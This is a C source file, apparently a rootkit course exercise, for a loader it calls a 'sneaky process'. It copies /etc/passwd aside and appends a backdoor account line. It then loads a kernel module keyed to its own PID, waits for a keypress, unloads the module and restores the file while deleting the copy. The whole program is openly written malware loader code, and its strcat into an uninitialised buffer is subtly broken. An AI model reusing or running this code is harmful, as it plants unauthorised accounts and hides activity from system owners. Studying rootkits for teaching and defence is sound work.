#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>


// this process will insert the malicious module into
// operating system and called a loop when comuter will
// implemented the malicous system call in the module
int main(void) {
  // status sign, take the system call's return value
  int status;
  
  // steps that rootkit should follow:
  
  //step1: print the PID of this sneaky process
  printf("sneaky_process pid = %d\n", getpid());
  
  //step2: malicious act copy password file and change
  
  //const char* fromFile = "/etc/passwd";
  //const char* toFile = "/tmp/passwd";
  //pid_t child_pid = fork();

  //execute the cp command: copy from /etc/passwd to /tmp 
  status = system("cp /etc/passwd /tmp");
  if(status < 0){
    printf("cp error: %s", strerror(errno));
    return EXIT_FAILURE;
 }
  //print a new line in the file
  //use IO redirection, print the new line after passwd 
  status = system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
  if(status < 0){
    printf("echo error: %s", strerror(errno));
    return EXIT_FAILURE;
 }
  //step3: load the sneaky module using inmod(insert module)
  char pid [128];
  sprintf(pid, "%d", getpid());

  // use strcat to concatenate the string continually
  char inmod_call[1024];
  strcat(inmod_call, "insmod sneaky_mod.ko pid=");
  strcat(inmod_call, pid);

  // use the inmod call with the pid key-value argument
  status = system(inmod_call);
  if(status < 0){
    printf("inmod error: %s", strerror(errno));
    return EXIT_FAILURE;
  }
    
  //step4: read characters from keyboard until char 'q'
  while (getchar() != 'q') {
  }

  //step5: unload the module using rmmod(remove module)
  status = system("rmmod sneaky_mod");  
  if(status < 0){
    printf("rmmod error: %s", strerror(errno));
    return EXIT_FAILURE;
  }
  //step6: restore the password file
  //substitue the etc/passwd file with the temp file
  status = system("cp /tmp/passwd /etc/");
  if(status < 0){
    printf("cp error: %s", strerror(errno));
    return EXIT_FAILURE;
  }
  //remove the temp file, deleting the log
  status = system("rm /tmp/passwd");
  if(status < 0){
    printf("rm error: %s", strerror(errno));
    return EXIT_FAILURE;
  }
  
  return EXIT_SUCCESS;
}
